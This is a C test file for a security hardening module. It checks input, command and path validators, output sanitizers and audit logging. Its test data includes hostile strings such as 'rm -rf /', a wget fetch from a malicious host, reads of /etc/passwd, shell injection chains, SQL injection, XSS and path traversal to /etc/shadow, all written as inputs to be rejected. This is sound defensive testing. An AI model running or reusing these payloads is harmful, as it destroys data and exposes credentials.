/**
 * @file test_security.c
 * @brief Comprehensive tests for security hardening system
 * @author XMD Implementation Team
 * @date 2025-07-25
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include "../../include/security.h"

/**
 * @brief Test input validation functionality
 */
static void test_input_validation(void) {
    printf("Testing input validation...\n");
    
    // Test valid inputs
    assert(security_validate_input("hello world", 100) == SECURITY_VALID);
    assert(security_validate_input("file.md", 100) == SECURITY_VALID);
    assert(security_validate_input("normal text 123", 100) == SECURITY_VALID);
    
    // Test length limits
    char long_string[1000];
    memset(long_string, 'a', 999);
    long_string[999] = '\0';
    assert(security_validate_input(long_string, 500) == SECURITY_RESOURCE_LIMIT);
    assert(security_validate_input(long_string, 1000) == SECURITY_VALID);
    
    // Test injection attempts
    assert(security_validate_input("'; DROP TABLE users; --", 100) == SECURITY_INJECTION_DETECTED);
    assert(security_validate_input("<script>alert('xss')</script>", 100) == SECURITY_INJECTION_DETECTED);
    assert(security_validate_input("$(rm -rf /)", 100) == SECURITY_INJECTION_DETECTED);
    assert(security_validate_input("${IFS}cat${IFS}/etc/passwd", 100) == SECURITY_INJECTION_DETECTED);
    
    // Test null input
    assert(security_validate_input(NULL, 100) == SECURITY_INVALID_INPUT);
    
    printf("✓ Input validation tests passed\n");
}

/**
 * @brief Test command validation functionality
 */
static void test_command_validation(void) {
    printf("Testing command validation...\n");
    
    // Test safe commands
    assert(security_validate_command("echo hello") == SECURITY_VALID);
    assert(security_validate_command("date") == SECURITY_VALID);
    assert(security_validate_command("ls -la") == SECURITY_VALID);
    
    // Test dangerous commands
    assert(security_validate_command("rm -rf /") == SECURITY_PERMISSION_DENIED);
    assert(security_validate_command("sudo rm file") == SECURITY_PERMISSION_DENIED);
    assert(security_validate_command("cat /etc/passwd") == SECURITY_PERMISSION_DENIED);
    assert(security_validate_command("wget http://malicious.com/script.sh") == SECURITY_PERMISSION_DENIED);
    
    // Test command injection
    assert(security_validate_command("echo hello; rm -rf /") == SECURITY_INJECTION_DETECTED);
    assert(security_validate_command("echo hello && rm file") == SECURITY_INJECTION_DETECTED);
    assert(security_validate_command("echo hello | sh") == SECURITY_INJECTION_DETECTED);
    assert(security_validate_command("echo `rm file`") == SECURITY_INJECTION_DETECTED);
    assert(security_validate_command("echo $(rm file)") == SECURITY_INJECTION_DETECTED);
    
    // Test null command
    assert(security_validate_command(NULL) == SECURITY_INVALID_INPUT);
    
    printf("✓ Command validation tests passed\n");
}

/**
 * @brief Test path validation functionality
 */
static void test_path_validation(void) {
    printf("Testing path validation...\n");
    
    // Test valid paths
    assert(security_validate_path("/tmp/safe.txt", "/tmp") == SECURITY_VALID);
    assert(security_validate_path("/home/user/doc.md", "/home/user") == SECURITY_VALID);
    assert(security_validate_path("relative/path.txt", ".") == SECURITY_VALID);
    
    // Test path traversal attacks
    assert(security_validate_path("/tmp/../etc/passwd", "/tmp") == SECURITY_PATH_TRAVERSAL);
    assert(security_validate_path("/home/user/../../etc/shadow", "/home/user") == SECURITY_PATH_TRAVERSAL);
    assert(security_validate_path("../../../etc/passwd", ".") == SECURITY_PATH_TRAVERSAL);
    assert(security_validate_path("/tmp/./../../etc/passwd", "/tmp") == SECURITY_PATH_TRAVERSAL);
    
    // Test absolute paths outside base
    assert(security_validate_path("/etc/passwd", "/tmp") == SECURITY_PATH_TRAVERSAL);
    assert(security_validate_path("/home/other/file.txt", "/home/user") == SECURITY_PATH_TRAVERSAL);
    
    // Test null inputs
    assert(security_validate_path(NULL, "/tmp") == SECURITY_INVALID_INPUT);
    assert(security_validate_path("/tmp/file.txt", NULL) == SECURITY_INVALID_INPUT);
    
    printf("✓ Path validation tests passed\n");
}

/**
 * @brief Test output sanitization functionality
 */
static void test_output_sanitization(void) {
    printf("Testing output sanitization...\n");
    
    // Test basic sanitization
    char* result = security_sanitize_output("Hello <script>alert('xss')</script> World");
    assert(result != NULL);
    assert(strstr(result, "<script>") == NULL);
    assert(strstr(result, "Hello") != NULL);
    assert(strstr(result, "World") != NULL);
    free(result);
    
    // Test HTML sanitization
    result = security_sanitize_html("<p>Safe content</p><script>dangerous()</script>");
    assert(result != NULL);
    assert(strstr(result, "<p>") != NULL);
    assert(strstr(result, "Safe content") != NULL);
    assert(strstr(result, "<script>") == NULL);
    free(result);
    
    // Test command output sanitization
    result = security_sanitize_command_output("Normal output\\n<iframe>malicious</iframe>");
    assert(result != NULL);
    assert(strstr(result, "Normal output") != NULL);
    assert(strstr(result, "<iframe>") == NULL);
    free(result);
    
    // Test null input
    result = security_sanitize_output(NULL);
    assert(result == NULL);
    
    printf("✓ Output sanitization tests passed\n");
}

/**
 * @brief Test security audit system
 */
static void test_security_audit(void) {
    printf("Testing security audit system...\n");
    
    // Initialize audit system
    char temp_file[] = "/tmp/xmd_audit_test_XXXXXX";
    int fd = mkstemp(temp_file);
    assert(fd != -1);
    close(fd);
    
    assert(security_audit_init(temp_file) == 0);
    
    // Test logging various events
    assert(SECURITY_AUDIT(AUDIT_INPUT_VALIDATION, "Test input validation", SECURITY_VALID) == 0);
    assert(SECURITY_AUDIT(AUDIT_COMMAND_EXECUTION, "Test command execution", SECURITY_INJECTION_DETECTED) == 0);
    assert(SECURITY_AUDIT(AUDIT_FILE_ACCESS, "Test file access", SECURITY_PATH_TRAVERSAL) == 0);
    
    // Test retrieving audit entries
    security_audit_entry* entries = NULL;
    size_t count = 0;
    uint64_t start_time = 0;
    uint64_t end_time = UINT64_MAX;
    
    assert(security_audit_get_entries(start_time, end_time, &entries, &count) == 0);
    assert(count >= 3);
    assert(entries != NULL);
    
    // Verify entries
    bool found_input_validation = false;
    bool found_command_execution = false;
    bool found_file_access = false;
    
    for (size_t i = 0; i < count; i++) {
        assert(entries[i].message != NULL);
        assert(entries[i].source_file != NULL);
        assert(entries[i].source_function != NULL);
        
        if (entries[i].type == AUDIT_INPUT_VALIDATION) {
            found_input_validation = true;
        } else if (entries[i].type == AUDIT_COMMAND_EXECUTION) {
            found_command_execution = true;
        } else if (entries[i].type == AUDIT_FILE_ACCESS) {
            found_file_access = true;
        }
    }
    
    assert(found_input_validation);
    assert(found_command_execution);
    assert(found_file_access);
    
    // Cleanup
    free(entries);
    security_audit_cleanup();
    unlink(temp_file);
    
    printf("✓ Security audit tests passed\n");
}

/**
 * @brief Test security validation with audit integration
 */
static void test_validation_with_audit(void) {
    printf("Testing validation with audit integration...\n");
    
    // Initialize audit for this test
    char temp_file[] = "/tmp/xmd_audit_integration_XXXXXX";
    int fd = mkstemp(temp_file);
    assert(fd != -1);
    close(fd);
    
    assert(security_audit_init(temp_file) == 0);
    
    // Test validation macros
    assert(SECURITY_VALIDATE_AND_AUDIT("safe input", 100) == SECURITY_VALID);
    assert(SECURITY_VALIDATE_AND_AUDIT("'; DROP TABLE users; --", 100) == SECURITY_INJECTION_DETECTED);
    
    // Verify audit entries were created
    security_audit_entry* entries = NULL;
    size_t count = 0;
    assert(security_audit_get_entries(0, UINT64_MAX, &entries, &count) == 0);
    assert(count >= 2);
    
    // Cleanup
    free(entries);
    security_audit_cleanup();
    unlink(temp_file);
    
    printf("✓ Validation with audit integration tests passed\n");
}

/**
 * @brief Test edge cases and error conditions
 */
static void test_edge_cases(void) {
    printf("Testing edge cases...\n");
    
    // Test empty strings
    assert(security_validate_input("", 100) == SECURITY_VALID);
    assert(security_validate_command("") == SECURITY_INVALID_INPUT);
    assert(security_validate_path("", "/tmp") == SECURITY_INVALID_INPUT);
    
    // Test very long inputs
    char* huge_input = malloc(100000);
    memset(huge_input, 'a', 99999);
    huge_input[99999] = '\0';
    assert(security_validate_input(huge_input, 1000) == SECURITY_RESOURCE_LIMIT);
    free(huge_input);
    
    // Test boundary conditions
    char boundary_test_51[52];
    memset(boundary_test_51, 'a', 51);
    boundary_test_51[51] = '\0';
    assert(security_validate_input(boundary_test_51, 50) == SECURITY_RESOURCE_LIMIT);
    
    char boundary_test_49[50];
    memset(boundary_test_49, 'a', 49);
    boundary_test_49[49] = '\0';
    assert(security_validate_input(boundary_test_49, 50) == SECURITY_VALID);
    
    printf("✓ Edge case tests passed\n");
}

/**
 * @brief Main test function
 */
int main(void) {
    printf("=== Security System Tests ===\n");
    
    test_input_validation();
    test_command_validation();
    test_path_validation();
    test_output_sanitization();
    test_security_audit();
    test_validation_with_audit();
    test_edge_cases();
    
    printf("\n✅ All security tests passed!\n");
    return 0;
}
